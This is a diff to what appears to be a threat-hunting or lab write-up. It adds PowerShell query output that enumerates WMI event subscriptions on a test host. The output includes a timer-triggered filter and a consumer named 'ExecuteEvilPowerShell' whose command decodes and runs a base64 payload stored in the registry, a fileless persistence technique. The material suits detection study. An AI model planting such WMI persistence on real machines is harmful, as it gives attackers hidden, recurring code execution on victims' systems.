@@ -41,10 +41,65 @@ We tweaked some of the parameters in the script to make sure the timer event lau
 ```Powershell
 Get-WmiObject -Namespace root\subscription -Class __EventFilter
 ```
+Result: 
+```Powershell
+__GENUS          : 2
+__CLASS          : __EventFilter
+__SUPERCLASS     : __IndicationRelated
+__DYNASTY        : __SystemClass
+__RELPATH        : __EventFilter.Name="SCM Event Log Filter"
+__PROPERTY_COUNT : 6
+__DERIVATION     : {__IndicationRelated, __SystemClass}
+__SERVER         : W10B1
+__NAMESPACE      : ROOT\subscription
+__PATH           : \\W10B1\ROOT\subscription:__EventFilter.Name="SCM Event Log Filter"
+CreatorSID       : {1, 2, 0, 0...}
+EventAccess      : 
+EventNamespace   : root\cimv2
+Name             : SCM Event Log Filter
+Query            : select * from MSFT_SCMEventLogEvent
+QueryLanguage    : WQL
+PSComputerName   : W10B1
+
+__GENUS          : 2
+__CLASS          : __EventFilter
+__SUPERCLASS     : __IndicationRelated
+__DYNASTY        : __SystemClass
+__RELPATH        : __EventFilter.Name="TimerTrigger"
+__PROPERTY_COUNT : 6
+__DERIVATION     : {__IndicationRelated, __SystemClass}
+__SERVER         : W10B1
+__NAMESPACE      : ROOT\subscription
+__PATH           : \\W10B1\ROOT\subscription:__EventFilter.Name="TimerTrigger"
+CreatorSID       : {1, 5, 0, 0...}
+EventAccess      : 
+EventNamespace   : root/cimv2
+Name             : TimerTrigger
+Query            : SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'
+QueryLanguage    : WQL
+PSComputerName   : W10B1
+```
+
 **EventConsumer**
 ```Powershell
 Get-WmiObject -Namespace root\subscription -Class __EventConsumer
 ```
+Result: 
+[snip]
+__GENUS               : 2
+__CLASS               : CommandLineEventConsumer
+__SUPERCLASS          : __EventConsumer
+__DYNASTY             : __SystemClass
+__RELPATH             : CommandLineEventConsumer.Name="ExecuteEvilPowerShell"
+__PROPERTY_COUNT      : 27
+__DERIVATION          : {__EventConsumer, __IndicationRelated, __SystemClass}
+__SERVER              : W10B1
+__NAMESPACE           : ROOT\subscription
+__PATH                : \\W10B1\ROOT\subscription:CommandLineEventConsumer.Name="ExecuteEvilPowerShell"
+CommandLineTemplate   : powershell.exe -NoP -C "iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey 
+                        -Name PayloadValue).PayloadValue)))"
+[snip]
+
 **EventFilter**
 ```Powershell
 Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
